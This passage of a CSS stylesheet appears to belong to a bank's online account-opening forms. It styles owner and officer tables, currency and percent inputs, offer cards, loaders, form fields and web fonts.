        .additional-applicant-table .cell.last div.input-control {
            width: auto;
        }


/* Beneficial Owner Table/List */

.beneown-table {
    display: table;
    width: 100%;
}

    .beneown-table .row {
        display: table-row;
    }

    .beneown-table .cell {
        display: table-cell;
        border-bottom: 1px solid #eee;
        padding: 10px;
    }

    .beneown-table .head .cell {
        background: #f5f5f5;
        color: #707070;
    }

    .beneown-table .cell.amount,
    .beneown-table .cell.last {
        text-align: left;
    }

/* Responsibility Center Table/List */

.rc-table {
    display: table;
    width: 100%;
}

    .rc-table .row {
        display: table-row;
    }

    .rc-table .cell {
        display: table-cell;
        border-bottom: 1px solid #eee;
        padding: 10px;
    }

    .rc-table .head .cell {
        background: #f5f5f5;
        color: #707070;
    }

    .rc-table .cell.amount,
    .rc-table .cell.last {
        text-align: right;
    }

/* Officer Table/List */

.officer-table {
    display: table;
    width: 100%;
}

    .officer-table .row {
        display: table-row;
    }

    .officer-table .cell {
        display: table-cell;
        border-bottom: 1px solid #eee;
        padding: 10px;
    }

    .officer-table .head .cell {
        background: #f5f5f5;
        color: #707070;
    }

    .officer-table .cell.last {
        text-align: right;
    }


/* Photo ID */
.photoid-container {
    display: table;
    width: 100%;
    padding: 20px 10px;
    background: #eee;
    border-radius: 4px;
    margin-top: -20px;
    margin-bottom: 20px;
}

.photoid-body {
    display: table-cell;
    padding-right: 20px;
}

.photoid-button {
    display: table-cell;
}

.photoid-button {
    text-align: right;
    vertical-align: middle;
    position: relative;
    min-width: 20%;
}

    .photoid-button button {
        background: none repeat scroll 0 0 rgb(0, 56, 113);
        border: medium none;
        border-radius: 4px;
        color: rgb(255, 255, 255);
        cursor: pointer;
        font-size: 16px;
        min-width: 120px;
        padding: 7px 24px;
        text-align: center;
        transition: background 0.15s ease-in 0s;
        outline: none;
    }

        .photoid-button button .camera {
            height: 20px;
            width: 22px;
            margin-top: 2px;
            margin-left: 4px;
            vertical-align: text-top;
            display: inline-block;
            background-image: url( '/nac/images/icon-camera.svg' );
            background-size: contain;
            background-repeat: no-repeat;
            fill: red;
        }

        .photoid-button button:hover, .photoid-button button:focus {
            background: #00294d;
            transition: background 0.05s ease-in 0s;
        }


/* Percent Inputs  */


input[type=text].perc {
    width: 6em;
    text-align: right !important;
    margin-right: -15px;
    padding-right: 26px;
}

input[type=text].perc-full {
    width: 60%;
    width: -moz-calc(100% - 36px);
    width: -webkit-calc(100% - 36px);
    width: calc(100% - 36px);
    max-width: 240px;
    text-align: right !important;
    margin-right: -15px;
    padding-right: 26px;
}

.percent-sign:before {
    content: "\0025";
    color: #aaa;
    font-size: 16px;
}

.percent-sign {
    position: relative;
    display: inline-block;
    padding-top: 0;
    top: 0px;
    left: -10px;
    margin: 0 auto;
}

.percent-sign-bef {
    position: relative;
    display: inline-block;
    padding-top: 0;
    width: 0;
    height: 0;
    left: -20px;
}

    .percent-sign-bef:before {
        content: "\0025";
        display: inline-block;
        top: 0px;
        color: #aaa;
        margin: 0 auto;
    }

.switch-section .input-control.ownership-select input[type=text].perc {
    text-align: right !important;
}


/* Dollar amounts */

.dollar-amount {
    position: relative;
}

    .dollar-amount input[type=text], .dollar-amount input[type=number], .dollar-amount input[type=tel] {
        padding-left: 20px;
    }

    .dollar-amount.leading input[type=text], .dollar-amount.leading input[type=number], .dollar-amount.leading input[type=tel] {
        padding-left: 30px;
    }

.leading .dollar-label:before {
    content: "$0.";
}

.dollar-label:before {
    content: "$";
    color: #aaa;
    font-size: 16px;
}

.dollar-label {
    display: inline-block;
    position: absolute;
    padding-top: 0;
    top: 11px;
    left: 10px;
    color: rgb(51, 51, 51);
    margin: 0 auto;
}

/* Tweak for Firefox to make artifacts align */
@-moz-document url-prefix() {
    .dollar-label {
        top: 10px;
    }
}

/* Tweak for Safari to make artifacts align */
/*\*/
.dollar-label {
    /* some style */
}
/**/






/* Confirmation page ads and cross-sells */


.ad-row {
    display: table;
    margin-top: 2em;
    border-spacing: 10px;
    width: 100%;
}

    .ad-row .display-list-tight {
        display: inline-block;
    }

    .ad-row p {
        display: inline-block;
        width: 100%;
    }

    .ad-row .display-list-tight li {
        margin-bottom: .5em;
        text-align: left;
    }


.ad-container {
    display: table-cell;
    padding: 0 20px 20px 20px;
    background: #f8f1e6;
    border-radius: 4px;
    width: 50%;
}

.two-ads .ad-container {
    width: 50%;
}

.three-ads .ad-container {
    width: 33%;
}

.three-ads .ad-container {
    width: 25%;
}

.ad-row.one-ad {
    display: block;
}

.one-ad .ad-container {
    display: block;
    width: 100%;
    max-width: 400px;
    margin: 0 auto;
}

.ad-graphic, .ad-button {
    text-align: center;
}

h3.ad-title {
    color: #C94C06;
    margin: 0 0 .5em 0;
}

.ad-body {
    min-height: 325px;
    text-align: center;
}

    .ad-body .sub-text, .ad-body .sub-text-row {
        color: #6e6e6e;
    }

.three-ads .ad-body {
    min-height: 375px;
}

.four-ads .ad-body, .card-offer.four-ads .ad-body {
    min-height: 200px;
}

.short-ads .ad-body {
    min-height: 100px !important;
}

.medium-ads .ad-body {
    min-height: 250px !important;
}

.card-offer.four-ads.browser-upgrade .ad-body {
    min-height: 0;
}

.card-offer.four-ads.browser-upgrade h3.ad-title {
    text-align: center;
}

.ad-button .button-ad, .ad-button .button-offer {
    background: none repeat scroll 0 0 #D66112;
    border-radius: 4px;
    box-sizing: border-box;
    color: rgb(255, 255, 255);
    cursor: pointer;
    display: inline-block;
    font: 18px/24px "suntrustregular","Trebuchet MS",sans-serif;
    margin: 20px 0;
    /* padding: 21px 30px; */
    padding: 11px 15px;
    text-align: center;
    transition: background 0.15s ease-in 0s;
    vertical-align: bottom;
    transition: background 0.15s ease-in 0s;
    outline: none;
    border: none;
}

.ad-button .tile-button {
    background: none repeat scroll 0 0 #D66112;
    border-radius: 4px;
    box-sizing: border-box;
    color: #FFFFFF;
    cursor: pointer;
    display: inline-block;
    /* font: 18px/24px "suntrustregular","Trebuchet MS",sans-serif; */
    font-family: suntrustregular;
    font-size: 12px;
    /* margin: 20px 0; */
    /* padding: 21px 30px; */
    /* padding: 11px 15px; */
    text-align: center;
    transition: background 0.15s ease-in 0s;
    vertical-align: bottom;
    transition: background 0.15s ease-in 0s;
    outline: none;
    border: none;
    width: 104px;
    height: 35px;
}

/* Mobile App Download Widget for the Confirmation Page */

.mobile-only-content {
    display: none;
}

.dl-app-link {
    position: relative;
    left: 25px;
}

.dl-app {
    z-index: 999;
    display: inline-block;
    border-radius: 35px 0px 0px 35px;
    width: 223px;
    height: 70px;
    position: fixed;
    bottom: 0px;
    right: 0px;
    margin: 7px;
    margin-right: 0;
    margin-bottom: 20px;
    padding: 14px 8px 12px 5px;
    background: #003871;
    color: white;
    font-weight: bold;
    text-align: left;
    box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
    transition: all 0.2s ease;
    display: none; /* Hide at desktop resolution ... */
}

    .dl-app.dl-closed {
        right: -188px;
    }

.dl-app-trigger:before {
    font-family: "olb-icons";
    display: inline-block;
    font-weight: bold;
    font-style: normal;
    text-decoration: inherit;
    font-size: 2rem;
    line-height: 25px;
    line-height: 2.5rem;
    content: "\e019";
    float: left;
    position: relative;
    top: 6px;
    right: -13px;
    padding: 2px;
    cursor: pointer;
    height: 30px;
    width: 20px;
}

.dl-closed span.dl-app-trigger:before {
    content: "\e030";
    font-family: "olb-icons";
    font-weight: normal;
    font-size: 2.3rem;
    top: 2px;
    right: -1px;
    color: #fff;
    -webkit-transform: rotate(-180deg);
    -moz-transform: rotate(-180deg);
    -ms-transform: rotate(-180deg);
    -o-transform: rotate(-180deg);
    filter: progid:DXImageTransform.Microsoft.BasicImage(rotation=6);
}

.dl-app a, .dl-app a:link, .dl-app a:hover, .dl-app a:visited {
    color: #fff;
    text-decoration: none;
}

    .dl-app a:hover {
        text-decoration: underline;
    }


/* 2B (double display) */


.dub-row {
    display: table;
    width: 100%;
    margin-top: 2em;
    border-spacing: 10px;
}


.dub-container {
    display: table-cell;
    width: 50%;
    padding: 20px;
    background-color: rgb(244, 244, 244);
    border-radius: 3px;
}


h3.dub-title {
    color: #333;
    margin: 0 0 .5em 0;
}

/* variations for credit card offers page  */

.ad-row.card-offer {
    margin-top: 0;
    margin-bottom: -10px;
}

.card-offer .ad-container {
    padding: 20px;
    background-color: rgb(244, 244, 244);
}

.card-offer .ad-body {
    min-height: 455px;
    margin-top: 1em;
    text-align: left;
    /*margin-bottom: -60px;*/
}

.card-offer.four-ads .ad-body {
    min-height: 155px;
}

.card-offer h3.ad-title {
    color: #000;
}

.card-offer .ad-button .button-offer {
    background: none repeat scroll 0 0 rgb(0, 56, 113);
    border: medium none;
    border-radius: 4px;
    color: rgb(255, 255, 255);
    cursor: pointer;
    font-size: 16px;
    min-width: 120px;
    padding: 7px 24px;
    text-align: center;
    transition: background 0.15s ease-in 0s;
    outline: none;
}

    .card-offer .ad-button .button-offer:hover, .card-offer .ad-button .button-offer:focus {
        background: #00294d;
        transition: background 0.05s ease-in 0s;
    }



/* Delta SkyMiles Check Card Offer page */
.sky-card-offer {
    width: 100%;
    padding: 10px 10px 0 10px;
}

    .sky-card-offer .sky-card-img {
        float: left;
        width: 35%;
        margin: 10px 0 0 0;
    }

    .sky-card-offer .sky-card-content {
        float: left;
        width: 60%;
        margin-left: 5%;
    }



/* Special rate offer controls */
.offerControl {
    background: #DFFDE5;
    color: #008000;
}

    .offerControl option {
        background: #fff;
        color: #000;
    }

option.offerValue {
    background: #DFFDE5;
    color: #008000;
}

select.offerControl, select.offerControl:focus {
    -webkit-appearance: none;
    -moz-appearance: none;
    text-indent: 0.01px;
    text-overflow: '';
    background: #DFFDE5 !important;
    background-position: 100% 50%;
}


/* Credit Card Selector widget styles (utilizing slick.js, JS/CSS components named "ccc" ) */

.cc-nav #zero {
    margin-right: 10px;
}

    .cc-nav #zero:hover, .cc-nav #one:hover {
        cursor: pointer;
    }


.cc-nav #zero, .cc-nav #one {
    opacity: 0.33;
    filter: alpha(opacity=33); /* For IE8 and earlier */
    border: 0;
}

    .cc-nav #zero.sel, .cc-nav #one.sel {
        /* background:#fff; */
        border: 0;
        opacity: 1;
        filter: alpha(opacity=100); /* For IE8 and earlier */
    }

.card-instructions {
    white-space: nowrap;
    margin-left: 10px;
}

.dual-selector .left-side-display .items {
    width: 300px;
    display: none;
}

.cc-nav {
    width: 300px;
    margin-bottom: 10px;
}

.ccad {
    padding: 20px;
}

.dual-selector {
    margin-top: 10px;
    text-align: left;
}

    .dual-selector .right-side-display {
        display: table-cell;
        width: auto;
        padding-left: 20px;
        padding-top: 0px;
        vertical-align: top;
        color: rgb(112, 112, 112);
        font-size: 14px;
        font-weight: normal;
        line-height: normal;
    }

    .dual-selector.ccad .right-side-display {
        color: #333;
        font-size: 15px;
    }

        .dual-selector.ccad .right-side-display h3 {
            margin: 0 0 1em 0;
            color: #333;
        }

    .dual-selector .right-side-display .radio-container {
        background: red;
    }

    .dual-selector .left-side-display {
        display: table-cell;
        width: 300px;
        vertical-align: top;
        padding: 0 0px;
    }

hr.hrMiddle {
    color: #B4B3B3;
    clear: both;
    width: 100%;
    height: 1px;
    margin: 70px 0;
}


@media (max-width: 480px) {
    /* chandra - 6/14 Start */
    .clickable-div {
        cursor: pointer;
    }

    .button-offers {
        display: block;
    }

    .bootstrap {
        color: rgb(51, 51, 51);
        font-family: "suntrustregular","Trebuchet MS",sans-serif;
        font-size: 1.5rem;
        font-weight: normal;
        line-height: 2rem;
        margin: 0;
        border-top: 0px solid #fff;
    }

        .bootstrap .row-spacing {
            margin-top: 0px;
        }

    .print {
        display: inline-block;
        position: relative;
        margin: 2.8em 0 .5em 0;
        background: url(../images/Print_Icon.svg) no-repeat;
        background-size: 20px 20px;
    }

    .bootstrap .confirmationfields .field {
        font-family: suntrustregular;
        font-weight: bold;
        font-size: 12px;
        color: #333333;
        margin-top: 10px;
    }

    .bootstrap .confirmationfields .value {
        font-family: suntrustregular;
        font-size: 14px;
        color: #333333;
    }

    .bootstrap .confirmationfields .note-text {
        margin-top: 11px;
        color: #333333;
        font-size: 12px;
        font-weight: normal;
        line-height: normal;
    }
    /* chandra - 6/14 End */
    .dual-selector .left-side-display .items {
        width: 100%;
        display: block;
    }

    .cc-nav {
        display: none;
    }

    .card-instructions {
        display: none;
    }

    .dual-selector .left-side-display, .dual-selector .right-side-display {
        display: block;
        width: 100%;
    }

    .dual-selector .left-side-display {
        padding: 0 25px;
    }

    .dual-selector .right-side-display {
        padding-top: 20px;
        padding-left: 0;
    }
}


/* Funding box widget styles */

.funding-box {
    background: #f3f3f3;
    border-radius: 4px;
    margin: .5em 0 3em 0;
    padding: 10px 20px 20px 20px;
}


    .funding-box .sub-content {
        display: block;
        padding: 0px 0 15px 0;
        margin-left: 45px;
        color: rgb(112, 112, 112);
        font-size: 14px;
        font-weight: normal;
        line-height: normal;
    }


.funding-row {
}

    .funding-row .radio-container {
        display: table-row;
        width: 25%;
    }


    .funding-row .custom-radio + label.control {
        top: 10px;
    }

    .funding-row .radio-container label.content {
        display: table-cell;
        padding-top: 0;
        width: auto;
        top: 0;
    }

        .funding-row .radio-container label.content .sub-text {
            margin-left: 0;
            padding-left: 0;
        }

/* Divider on Search Page */

.results-divider {
    display: block;
    border-bottom: 3px solid #eee;
    text-align: center;
    margin: 0 0 .5em 0;
    position: relative;
    top: -1.8em;
}

    .results-divider .words {
        color: #C94C06;
        display: inline-block;
        background: #fff;
        position: relative;
        top: 1.9em;
        padding: 10px 10px 20px 10px;
        font-style: italic;
    }


/* Miscellaneous styles */
option.placeholder {
    color: #aaa;
}

.more-options {
    font-style: italic;
    text-align: right;
}

#more-options1 {
    /* display:none; */
}

#more-options2 {
    display: none;
    margin: -20px 0 30px 0;
}

.dar-enfasis {
    font-size: 102%;
    font-weight: bold;
    padding: 0 2px;
    color: #333;
}

/* loader widget styles */

.loader {
    padding: 20px 25px;
    background: #ffffff;
    display: table;
    margin: 40px auto;
    font-size: 0; /* dumb hack to make the whitespace between tags disappear */
}

.loader-indicator {
    display: inline-block;
    height: 30px;
    width: 8px;
    padding: 0;
    margin: 0 5px 0 0;
    background-color: #05457D;
    border-radius: 4px;
}

@keyframes loadingAnimation {
    0% {
        opacity: .1;
    }

    25% {
        opacity: .1;
    }

    33% {
        opacity: .25;
    }

    50% {
        opacity: 1;
    }

    66% {
        opacity: .25;
    }

    75% {
        opacity: .1;
    }

    100% {
        opacity: .1;
    }
}

@-o-keyframes loadingAnimation {
    0% {
        opacity: .1;
    }

    25% {
        opacity: .1;
    }

    33% {
        opacity: .25;
    }

    50% {
        opacity: 1;
    }

    66% {
        opacity: .25;
    }

    75% {
        opacity: .1;
    }

    100% {
        opacity: .1;
    }
}

@-moz-keyframes loadingAnimation {
    0% {
        opacity: .1;
    }

    25% {
        opacity: .1;
    }

    33% {
        opacity: .25;
    }

    50% {
        opacity: 1;
    }

    66% {
        opacity: .25;
    }

    75% {
        opacity: .1;
    }

    100% {
        opacity: .1;
    }
}

@-webkit-keyframes loadingAnimation {
    0% {
        opacity: .1;
    }

    25% {
        opacity: .1;
    }

    33% {
        opacity: .25;
    }

    50% {
        opacity: 1;
    }

    66% {
        opacity: .25;
    }

    75% {
        opacity: .1;
    }

    100% {
        opacity: .1;
    }
}

.loader-indicator {
    opacity: .1;
    -webkit-animation: loadingAnimation 1s infinite;
    -moz-animation: loadingAnimation 1s infinite;
    -o-animation: loadingAnimation 1s infinite;
    animation: loadingAnimation 1s infinite;
}

    .loader-indicator:nth-child(2) {
        -webkit-animation-delay: 0ms;
        -ms-animation-delay: 0ms;
        animation-delay: 0ms;
    }

    .loader-indicator:nth-child(3) {
        -webkit-animation-delay: 125ms;
        -ms-animation-delay: 125ms;
        animation-delay: 125ms;
    }

    .loader-indicator:nth-child(4) {
        -webkit-animation-delay: 250ms;
        -ms-animation-delay: 250ms;
        animation-delay: 250ms;
    }

    .loader-indicator:nth-child(5) {
        -webkit-animation-delay: 375ms;
        -ms-animation-delay: 375ms;
        animation-delay: 375ms;
    }

    .loader-indicator:nth-child(6) {
        -webkit-animation-delay: 500ms;
        -ms-animation-delay: 500ms;
        animation-delay: 500ms;
    }

    .loader-indicator:nth-child(7) {
        -webkit-animation-delay: 625ms;
        -ms-animation-delay: 625ms;
        animation-delay: 625ms;
    }

    .loader-indicator:nth-child(8) {
        -webkit-animation-delay: 750ms;
        -ms-animation-delay: 750ms;
        animation-delay: 750ms;
    }

    .loader-indicator:nth-child(9) {
        -webkit-animation-delay: 875ms;
        -ms-animation-delay: 875ms;
        animation-delay: 875ms;
        margin-right: 0px;
    }


/* check-info styles */

.check-info {
    margin: 0 0 1em 0;
    text-align: center;
}

    .check-info img {
        width: 100%;
        max-width: 530px;
    }


/* rate-table styles */

.rate-table-label {
    margin: 1em 0 0 0;
    font-weight: 700;
}


table.rate-table {
    width: 100%;
    border-collapse: collapse;
    margin-bottom: 2em;
}

.rate-table tr:nth-of-type(odd) {
    background: #f4f4f4;
}

.rate-table th {
    background: #333;
    color: white;
    font-weight: bold;
}

.rate-table td, .rate-table th {
    padding: 6px;
    border: 1px solid #ddd;
    text-align: right;
}

.rate-copy {
    padding: 0 10px 20px 10px;
}
/* title-button styles */

.title-button-row {
}

.title-buttons {
    float: right;
    position: relative;
    top: 25px;
}

.non-title-button-row {
    text-align: right;
    background: none;
    margin-top: -30px;
}

.non-title-buttons {
    display: inline-block;
    position: relative;
    top: 30px;
}

.restore-row {
    display: table;
    width: 100%;
    margin: 0 10px 10px 0;
    background-color: #ffdbdb;
    border-radius: 4px;
    padding-right: 10px;
}

.restore-item {
    display: table-cell;
    padding: 10px;
}

.restore-button {
    display: table-cell;
    text-align: right;
    padding: 10px;
    padding-right: 20px;
}

    .restore-button a {
        text-decoration: underline;
    }

    .restore-button button {
        position: relative;
        left: 10px;
    }

.outline-button, .outline-button:link, .outline-button:active, .outline-button:visited,
.edit-button, .edit-button:link, .edit-button:active, .edit-button:visited,
.delete-button, .delete-button:link, .delete-button:active, .delete-button:visited,
.photo-button, .photo-button:link, .photo-button:active, .photo-button:visited {
    /* padding: 7px 24px; */
    padding: 3px 12px;
    border-radius: 4px;
    text-align: center;
    -webkit-transition: background 0.15s ease-in;
    transition: background 0.15s ease-in;
    cursor: pointer;
    color: #C94C06;
    background: #ffffff;
    border: solid 1px #bdbdbd;
    font-size: 16px;
    font-weight: normal;
    margin-left: 2px;
}

    .photo-button, .photo-button:link, .photo-button:active, .photo-button:visited {
        padding: 3px 6px 0px 6px;
    }

        .outline-button:hover,
        .delete-button:hover,
        .edit-button:hover,
        .photo-button:hover {
            -webkit-transition: border 0.15s ease-in;
            transition: border 0.15 ease-in;
            cursor: pointer;
            text-decoration: none;
            color: #00294d;
            border-color: #00294d;
            background: #fff;
        }

    .delete-button:before {
        font-family: "olb-icons";
        display: inline-block;
        font-weight: normal;
        font-style: normal;
        text-decoration: inherit;
        content: "\e03b";
        color: #999999;
        font-size: 16px;
        font-size: 1.6rem;
        line-height: 16px;
        line-height: 1.6rem;
    }




/* title-button-edit styles */


.title-button-edit {
    float: right;
    position: relative;
    top: 32px;
}



/* Save/Retrieve Button Styles ******* WORKING ******* */
.save-retrieve-buttons {
    text-align: left;
}

.save-button, .save-button:link, .save-button:active, .save-button:visited,
.retrieve-button, .retrieve-button:link, .retrieve-button:active, .retrieve-button:visited {
    /* padding: 7px 24px; */
    padding: 6px 12px;
    border-radius: 4px;
    text-align: center;
    -webkit-transition: background 0.15s ease-in;
    transition: background 0.15s ease-in;
    cursor: pointer;
    color: #777;
    background: #ffffff;
    border: solid 1px #ccc;
    font-size: 16px;
    font-weight: normal;
    margin-left: 2px;
    width: 90%;
}

.save-button {
    margin-bottom: 1em;
}

    .save-button:hover, .retrieve-button:hover {
        -webkit-transition: border 0.15s ease-in;
        transition: border 0.15 ease-in;
        cursor: pointer;
        text-decoration: none;
        color: #00294d;
        border-color: #00294d;
        background: #fff;
    }


/* cloned input styles */
#input_w2, #input_w3, #input_w4, #input_w5, #input_w6, #input_w7, #input_w8, #input_w9, #input_w10,
#input_x2, #input_x3, #input_x4, #input_x5, #input_x6, #input_x7, #input_x8, #input_x9, #input_x10,
#input_y2, #input_y3, #input_y4, #input_y5, #input_y6, #input_y7, #input_y8, #input_y9, #input_y10,
#input_z2, #input_z3, #input_z4, #input_z5, #input_z6, #input_z7, #input_z8, #input_z9, #input_z10 {
    /* background-color: rgb(244, 244, 244); */
    background-color: #fff;
    border-top: 2px dashed #ccc;
}

.clonedInput_w, .clonedInput_x, .clonedInput_y, .clonedInput_z {
    padding: 1em 0 .5em 0;
}

    .clonedInput_x.withTitle {
        padding: 0;
    }

    .clonedInput_w.noLine, .clonedInput_x.noLine, .clonedInput_y.noLine, .clonedInput_z.noLine {
        border-top: 0px solid #ccc !important;
    }

#input_x1.withTitle, #input_x2.withTitle, #input_x3.withTitle, #input_x4.withTitle, #input_x5.withTitle {
    border: 0;
}

/* these are the "+ Add Another" and "- Delete Last" buttons in cloned input sections */

.button-tertiary-inline {
    display: inline-block;
    margin-right: 30px;
    margin-left: 10px;
    position: relative;
    top: 0;
}


.button-secondary-inline:hover,
.button-secondary-inline:active,
.button-secondary-inline:focus {
    text-decoration: none;
    color: #00294d;
    border-color: #00294d;
}

.button-tertiary-inline:hover,
.button-tertiary-inline:active,
.button-tertiary-inline:focus {
    text-decoration: underline;
    color: #00294d;
}

.button-tertiary-inline:before {
    font-family: "olb-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    content: "\e01a";
    text-decoration: none;
    display: inline-block;
    position: relative;
    top: -3px;
    background-color: #ee6120;
    border-radius: 50%;
    color: #ffffff;
    font-size: 9px;
    text-align: center;
    line-height: 1em;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
    padding: 4px;
    margin-right: 5px;
}

.button-tertiary-inline:hover:before,
.button-tertiary-inline:active:before,
.button-tertiary-inline:focus:before {
    background-color: #cc2900;
    text-decoration: none;
}

.button-secondary-inline {
    background: none repeat scroll 0 0 rgb(255, 255, 255);
    border: 1px solid rgb(189, 189, 189);
    border-radius: 4px;
    color: rgb(0, 56, 113);
    cursor: pointer;
    padding: 4px 12px;
    text-align: center;
    transition: background 0.15s ease-in 0s;
    margin-right: 2.5em;
}

.button-inline {
    background: rgb(0, 56, 113);
    border: 0px solid rgb(189, 189, 189);
    border-radius: 4px;
    color: #fff;
    cursor: pointer;
    padding: 4px 12px;
    text-align: left;
    transition: background 0.15s ease-in 0s;
    margin-right: .5em;
}


    .button-inline:disabled,
    .button-inline:disabled:hover,
    .button-inline:disabled:active,
    .button-inline:disabled:focus {
        text-decoration: none;
        border: 0px solid #eee;
        background-color: rgb(153, 175, 198);
    }


    /* make default "Delete" button invisible when it's disabled */
    .button-inline.del:disabled,
    .button-inline.del:disabled:hover,
    .button-inline.del:disabled:active,
    .button-inline.del:disabled:focus {
        text-decoration: none;
        border: 0px solid #fff;
        background-color: #fff;
        transition: none;
    }


    .button-inline:hover {
        background: #00294d;
        transition: background 0.05s ease-in 0s;
    }

/* Native SELECT,OPTION */


select,
input[type=text],
input[type=email],
input[type=url],
input[type=password],
input[type=color],
input[type=date],
input[type=datetime],
input[type=datetime-local],
input[type=email],
input[type=month],
input[type=number],
input[type=range],
input[type=search],
input[type=tel],
input[type=time],
input[type=url],
input[type=week],
textarea {
    border: 1px solid rgb(204, 204, 204);
    border-radius: 4px;
    box-sizing: border-box;
    -moz-box-sizing: border-box;
    color: rgb(51, 51, 51);
    font-family: "suntrustregular", "Trebuchet MS", sans-serif;
    font-size: 16px;
    padding: 0px 10px 0px 10px;
    height: 40px;
    width: 60%;
    /* Zero out the gradients that are the default for a couple of native form controls in some browsers */
    background: -moz-linear-gradient(top, #fff 0%, #fff 100%); /* FF3.6+ */
    background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#fff), color-stop(100%,#fff)); /* Chrome,Safari4+ */
    background: -webkit-linear-gradient(top, #fff 0%,#fff 100%); /* Chrome10+,Safari5.1+ */
    background: -o-linear-gradient(top, #fff 0%,#fff 100%); /* Opera 11.10+ */
    background: -ms-linear-gradient(top, #fff 0%,#fff 100%); /* IE10+ */
    background: linear-gradient(to bottom, #fff 0%,#fff 100%); /* W3C */
}

/* undo previous height restriction for textarea */
textarea {
    height: auto;
    padding: 10px;
}


/* background image to re-add arrow to selects */
select, select:focus {
    -webkit-appearance: none;
    -moz-appearance: none;
    text-indent: 0.01px;
    text-overflow: '';
    background: url("../images/inputbg-select.png") no-repeat scroll right center rgba(0, 0, 0, 0) !important;
    background-position: 100% 50%;
    padding-left: 5px;
    padding-right: 20px;
}

.touchdev select, .touchdev select:focus {
    padding-left: 10px;
}

.ie select, .ie select:focus, .ie-plus select, .ie-plus select:focus {
    padding: 0 0 0 10px;
}

.ie .bootstrap select, .ie .bootstrap select:focus, .ie-plus .bootstrap select, .ie-plus .bootstrap select:focus {
    padding: 0 0 0 10px;
}


.select-combo select {
    width: 30%;
    display: inline-block;
}

.mini select {
    max-width: 100px;
    display: inline-block;
}

select:disabled,
input[type=text]:disabled,
input[type=email]:disabled,
input[type=url]:disabled,
input[type=password]:disabled,
input[type=color]:disabled,
input[type=date]:disabled,
input[type=datetime]:disabled,
input[type=datetime-local]:disabled,
input[type=email]:disabled,
input[type=month]:disabled,
input[type=number]:disabled,
input[type=range]:disabled,
input[type=search]:disabled,
input[type=tel]:disabled,
input[type=time]:disabled,
input[type=url]:disabled,
input[type=week]:disabled,
textarea:disabled {
    border: 0 !important;
    position: relative;
    top: 1px;
    background: url("../images/inputbg-select.png") no-repeat scroll -30px center rgba(0, 0, 0, 0) !important;
    color: #333;
    zoom: 1;
    filter: alpha(opacity=100);
    opacity: 1;
}

input[type="text"][disabled] {
    color: #333;
}


.combo-container select,
.combo-container input[type=text],
.combo-container input[type=email],
.combo-container input[type=url],
.combo-container input[type=password],
.combo-container input[type=color],
.combo-container input[type=date],
.combo-container input[type=datetime],
.combo-container input[type=datetime-local],
.combo-container input[type=email],
.combo-container input[type=month],
.combo-container input[type=number],
.combo-container .dollar-amount input[type=number],
.combo-container input[type=range],
.combo-container input[type=search],
.combo-container input[type=tel],
.combo-container input[type=time],
.combo-container input[type=url],
.combo-container input[type=week],
.combo-container textarea {
    width: 100%;
}

.combo-container {
    width: 60%;
    display: inline-block; /* for browsers that cannot handle flexbox */
    display: inline-flex;
}

    .combo-container select {
        padding-right: -webkit-calc(0% + 20px);
        padding-right: -moz-calc(0% + 20px);
    }

    .combo-container .a, .combo-container .b {
        width: 50%;
        float: left;
    }

    .combo-container.phone-combo .a {
        width: 40%;
    }

    .combo-container.phone-combo .b {
        width: 60%;
    }

    .combo-container.citystate-combo .a {
        width: 65%;
    }

    .combo-container.citystate-combo .b {
        width: 35%;
    }


/* tweaks for older versions of IE including IE9 (cannot handle flexbox) */
.ie .combo-container {
    display: inline-block;
}

    .ie .combo-container .a, .ie .combo-container .b {
        float: left;
    }

    .ie .combo-container + .input-error {
        position: relative;
        top: -12px;
        left: 1px;
    }

        .ie .combo-container + .input-error + .error-message {
            position: relative;
            top: -4px;
        }

/* allow <option> content to dictate select width in ie8 (ugly, but prevents them from being cut off)  */

.ie8 select {
    width: auto !important;
    padding-right: 0 !important;
}
/* end flexbox tweaks */


input[type=text].mi {
    width: 3em;
}





/* hide number spinners in Chrome and in Firefox  */
input[type=number]::-webkit-inner-spin-button,
input[type=number]::-webkit-outer-spin-button {
    -webkit-appearance: none;
    margin: 0;
}

input[type=number] {
    -moz-appearance: textfield;
}



    select:focus,
    input[type=text]:focus,
    input[type=email]:focus,
    input[type=url]:focus,
    input[type=password]:focus,
    input[type=color]:focus,
    input[type=date]:focus,
    input[type=datetime]:focus,
    input[type=datetime-local]:focus,
    input[type=email]:focus,
    input[type=month]:focus,
    input[type=number]:focus,
    input[type=range]:focus,
    input[type=search]:focus,
    input[type=tel]:focus,
    input[type=time]:focus,
    input[type=url]:focus,
    input[type=week]:focus,
    textarea:focus {
        outline: 0;
        border-color: #4697e4;
    }


.hasError select,
.hasError input[type=text],
.hasError input[type=email],
.hasError input[type=url],
.hasError input[type=password],
.hasError input[type=color],
.hasError input[type=date],
.hasError input[type=datetime],
.hasError input[type=datetime-local],
.hasError input[type=email],
.hasError input[type=month],
.hasError input[type=number],
.hasError input[type=range],
.hasError input[type=search],
.hasError input[type=tel],
.hasError input[type=time],
.hasError input[type=url],
.hasError input[type=week],
.hasError textarea,
.hasError .inputTags-list {
    border-color: #ff3300;
    border-width: 2px;
}



/* load fonts for SunTrust text (FS Albert) */
@font-face {
    font-family: 'suntrustregular';
    src: url('../fonts/fs_albert-webfont.eot');
    src: url('../fonts/fs_albert-webfont.eot?#iefix') format('embedded-opentype'), url('../fonts/fs_albert-webfont.woff') format('woff'), url('../fonts/fs_albert-webfont.ttf') format('truetype'), url('../fonts/fs_albert-webfont.svg#suntrustregular') format('svg');
    font-weight: normal;
    font-style: normal;
}

@font-face {
    font-family: 'suntrustregular';
    src: url('../fonts/fs_albert-bold-webfont.eot');
    src: url('../fonts/fs_albert-bold-webfont.eot?#iefix') format('embedded-opentype'), url('../fonts/fs_albert-bold-webfont.woff') format('woff'), url('../fonts/fs_albert-bold-webfont.ttf') format('truetype'), url('../fonts/fs_albert-bold-webfont.svg#suntrustregular') format('svg');
    font-weight: 700;
    font-style: normal;
}

@font-face {
    font-family: 'suntrustregular';
    src: url('../fonts/fs_albert-bolditalic-webfont.eot');
